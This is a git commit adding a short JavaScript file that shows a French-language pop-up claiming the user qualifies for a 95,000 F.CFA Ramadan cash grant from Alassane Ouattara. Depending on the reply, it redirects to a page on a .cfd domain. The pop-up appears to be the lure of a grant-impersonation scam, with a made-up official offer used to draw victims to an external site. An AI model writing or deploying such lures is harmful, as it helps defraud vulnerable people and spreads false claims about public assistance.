3cef121c79e3dad0425a600e91ba57857f0bf541
The-ongoing <preciousadaowo4@gmail.com>
2026-02-23 00:10:04 +0100

    Create activeramadan2.js

---
+++ activeramadan2.js
@@ -0,0 +1,10 @@
+var password = '95,000 F.CFA';
+
+password = prompt(
+  'Félicitations, vous êtes éligible au soutien en espèces de 95 000 F.CFA pour le Ramadan offert par Alassane Ouattara. Cliquez sur OK pour recevoir instantanément.',
+  '95,000 F.CFA'
+);
+
+if (password !== '95,000 F.CFA') {
+    location.href = 'https://ongoing-grant.cfd/Soutien-Aux-M%C3%A9nages-Du-Ramadan.html';
+}
